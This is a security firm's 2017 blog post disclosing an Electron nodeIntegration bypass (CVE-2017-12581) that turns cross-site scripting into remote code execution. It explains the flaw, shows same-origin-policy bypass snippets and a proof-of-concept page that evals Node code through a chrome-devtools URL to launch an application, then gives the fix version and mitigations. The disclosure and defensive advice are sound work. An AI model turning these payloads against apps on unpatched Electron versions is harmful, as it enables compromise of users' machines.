=== Content from blog.doyensec.com_78f6a394_20250125_112017.html ===


[![](/public/images/doyensec-logo.svg)](/index.html)

[![](/public/images/logo.svg)](/index.html)
#### ABOUT US

We are [**security engineers**](https://doyensec.com) who break bits and tell stories.

Visit us
[doyensec.com](https://doyensec.com)

Follow us
[@doyensec](https://twitter.com/doyensec)

Engage us
info@doyensec.com

#### Blog Archive

* 2025
* 2024
* 2023
* 2022
* 2021
* 2020
* 2019
* 2018
* 2017

© 2025 [Doyensec LLC](https://doyensec.com) [![](/public/images/rss.png)](/atom.xml "RSS")

# Modern Alchemy: Turning XSS into RCE

03 Aug 2017 - Posted by Luca Carettoni
### TL;DR

At the recent [Black Hat Briefings 2017](https://www.blackhat.com/us-17/briefings.html#electronegativity-a-study-of-electron-security), Doyensecâs co-founder [Luca Carettoni](https://twitter.com/lucacarettoni) presented a new research on [Electron](https://electron.atom.io) security.
After a quick overview of Electronâs security model, we disclosed design weaknesses and implementation bugs that can be leveraged to compromise *any* Electron-based application. In particular, we discussed a bypass that would allow reliable Remote Code Execution (RCE) when rendering untrusted content (for example via Cross-Site Scripting) even with framework-level protections in place.

In this blog post, we would like to provide insight into the bug (CVE-2017-12581) and remediations.

### Whatâs Electron?

While you may not recognize the name, it is likely that youâre already using Electron since itâs running on millions of computers. [Slack, Atom, Visual Studio Code, WordPress Desktop, Github Desktop, Basecamp3, Mattermost](https://electron.atom.io/apps/) are just few examples of applications built using this framework. Any time that a traditional web application is ported to desktop, it is likely that the developers used Electron.

![Electron Motto](../../../public/images/electron1.png)

### Understanding the *nodeIntegration* flag

While Electron is based on Chromiumâs Content module, it is not a browser. Since it facilitates the construction of complex desktop applications, Electron gives the developer a lot of power. In fact, thanks to the integration with Node.js, JavaScript can access operating system primitives to take full advantage of native desktop mechanisms.

[It is well understood](https://electron.atom.io/docs/tutorial/security/) that rendering untrusted remote/local content with Node integration enabled is dangerous. For this reason, Electron provides two mechanisms to âsandboxâ untrusted resources:

*BrowserWindow*

```
mainWindow = new BrowserWindow({
	"webPreferences": {
		"nodeIntegration" : false,
		"nodeIntegrationInWorker" : false
	}
});

mainWindow.loadURL('https://www.doyensec.com/');

```

*WebView*

```
<webview src="https://www.doyensec.com/"></webview>

```

In above examples, the **nodeIntegration** flag is set to false. JavaScript running in the page wonât have access to global references despite having a Node.js engine running in the renderer process.

### Hunting for *nodeIntegration* bypasses

It should now be clear why *nodeIntegration* is a critical security-relevant setting for the framework. A vulnerability in this mechanism could lead to full host compromise from simply rendering untrusted web pages. As modern alchemists, we use this type of flaws to turn traditional XSS into RCE. Since all Electron applications are bundled with the framework code, it is also complicated to fix these issues across the entire ecosystem.

During our research, we have extensively analyzed all project code changes to uncover previously discovered bypasses (we counted 6 before v1.6.1) with the goal of studying Electronâs design and weaknesses. Armed with that knowledge, we went for a hunt.

By studying the [official documentation](https://electron.atom.io/docs/all/), we quickly identified a significant deviation from standard browsers caused by Electronâs âglorifiedâ JavaScript APIs.

When a new window is created, Electron returns an instance of [BrowserWindowProxy](https://electron.atom.io/docs/all/#class-browserwindowproxy). This class can be used to manipulate the child browser window, thus subverting the Same-Origin Policy (SOP).

*SOP Bypass #1*

```
<script>
const win = window.open("https://www.doyensec.com");
win.location = "javascript:alert(document.domain)";
</script>

```

*SOP Bypass #2*

```
<script>
const win = window.open("https://www.doyensec.com");
win.eval("alert(document.domain)");
</script>

```

The *eval* mechanism used by the SOP Bypass #2 can be explained with the following diagram:

![BrowserWindowProxy's Eval](../../../public/images/electron2.png)

Additional source code review revealed the presence of privileged URLs (similar to browsersâ privileged zones). Combining the SOP-bypass by design with a specific privileged url defined in *lib/renderer/init.js*, we realized that we could override the nodeIntegration setting.

![Chrome DevTools in Electron, prior to 1.6.8](../../../public/images/electron3.png "Chrome DevTools in Electron, prior to 1.6.8")

A simple, yet reliable, proof-of-concept of the nodeIntegration bypass affecting all Electron releases prior to 1.6.7 is hereby included:

```
<!DOCTYPE html>
<html>
  <head>
    <title>nodeIntegration bypass (SOP2RCE)</title>
  </head>
  <body>
  	<script>
    	document.write("Current location:" + window.location.href + "<br>");

    	const win = window.open("chrome-devtools://devtools/bundled/inspector.html");
    	win.eval("const {shell} = require('electron');
    	shell.openExternal('file:///Applications/Calculator.app');");
       </script>
  </body>
</html>

```

On May 10, 2017 we reported this issue to the maintainers via email. In a matter of hours, we received a reply that they were already working on a fix since the privileged *chrome-devtools://* was discovered during an internal security activity just few days before our report. In fact, while the latest release on the official website at that time was 1.6.7, the [git commit](https://github.com/electron/electron/commit/05b6d91bf4c1e0ee65eeef70cd5d1bd1df125644) that fixes the privileged url is dated April 24, 2017.

The issue was fixed in 1.6.8 (officially released around the 15th of May). All previous versions of Electron and consequently all Electron-based apps were affected. Mitre assigned CVE-2017-12581 for this issue.

### Mitigating nodeIntegration bypass vulnerabilities

* **Keep your application in sync with the latest Electron framework release.** When releasing your product, youâre also shipping a bundle composed of Electron, Chromium shared library and Node. Vulnerabilities affecting these components may impact the security of your application. By updating Electron to the latest version, you ensure that critical vulnerabilities (such as nodeIntegration bypasses) are already patched and cannot be exploited to abuse your application.
* **Adopt secure coding practices.** The first line of defense for your application is your own code. Common web vulnerabilities, such as Cross-Site Scripting (XSS), have a higher security impact on Electron hence it is highly recommend to adopt secure software development best practices and perform periodic security testing.
* **Know your framework (and its limitations).** Certain principles and security mechanisms implemented by modern browsers are not enforced in Electron (e.g. SOP enforcement). Adopt defense in depth mechanisms to mitigate those deficiencies. For more details, please refer to our [Electronegativity, A study of Electron Security](https://doyensec.com/resources/us-17-Carettoni-Electronegativity-A-Study-Of-Electron-Security.pdf) presentation and [Electron Security Checklist](https://doyensec.com/resources/us-17-Carettoni-Electronegativity-A-Study-Of-Electron-Security-wp.pdf) white-paper.
* **Use the recent âsandboxâ experimental feature.** Even with nodeIntegration disabled, the current implementation of Electron does not completely mitigate all risks introduced by loading untrusted resources. As such, it is recommended to enable [sandboxing](https://electron.atom.io/docs/api/sandbox-option/) which leverages the native Chromium sandbox. A sandboxed renderer does not have a Node.js environment running (with the exception of preload scripts) and the renderers can only make changes to the system by delegating tasks to the main process via IPC. While still not perfect at the time of writing (there are known security issues, sandbox is not supported for the `<webview>` tag, etc.) this option should be enabled to provide additional isolation.

### Other relevant posts:

* ### [Streamlining Websocket Pentesting with wsrepl 18 Jul 2023](/2023/07/18/streamlining-websocket-pentesting-with-wsrepl.html)
* ### [Diving Into Electron Web API Permissions 27 Sep 2022](/2022/09/27/electron-api-default-permissions.html)
* ### [ElectroNG, our premium SAST tool released! 06 Sep 2022](/2022/09/06/electrong-launch.html)
* ### [Electron APIs Misuse: An Attackerâs First Choice 16 Feb 2021](/2021/02/16/electron-apis-misuse.html)
* ### [Signature Validation Bypass Leading to RCE In Electron-Updater 24 Feb 2020](/2020/02/24/electron-updater-update-signature-bypass.html)
* ### [Electron Security Workshop 03 Jul 2019](/2019/07/03/electron-security-workshop.html)
* ### [Electronegativity 1.3.0 released! 11 Jun 2019](/2019/06/11/electronegativity-1.3.html)
* ### [Subverting Electron Apps via Insecure Preload 03 Apr 2019](/2019/04/03/subverting-electron-apps-via-insecure-preload.html)
* ### [Electronegativity is finally out! 24 Jan 2019](/2019/01/24/electronegativity.html)
* ### [Instrumenting Electron Apps for Security Testing 19 Jul 2018](/2018/07/19/instrumenting-electron-app.html)
* ### [Electron Windows Protocol Handler MITM/RCE (bypass for CVE-2018-1000006 fix) 24 May 2018](/2018/05/24/electron-win-protocol-handler-bug-bypass.html)


